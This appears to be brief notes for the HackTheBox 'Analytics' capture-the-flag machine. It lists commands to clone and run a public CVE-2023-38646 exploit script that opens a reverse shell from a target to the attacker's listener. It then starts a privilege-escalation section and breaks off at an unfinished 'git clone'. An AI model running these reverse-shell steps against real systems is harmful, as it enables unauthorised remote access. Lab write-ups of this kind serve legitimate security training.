# Analytics-htb-Rce
#first clone the repository
git clone https://github.com/securezeron/CVE-2023-38646
cd CVE-2023-38646
pip install -r requirements.txt
python3 CVE-2023-38646-Reverse-Shell.py -h
#the before run reverse shell start netact listeiner and  go back to run script as follows
python3 CVE-2023-38646-Reverse-Shell.py --rhost {Target Ip address} --lhost {your ip-adress} --lport {port to listen rervse shell} 
# Privileges escalation
git clone 
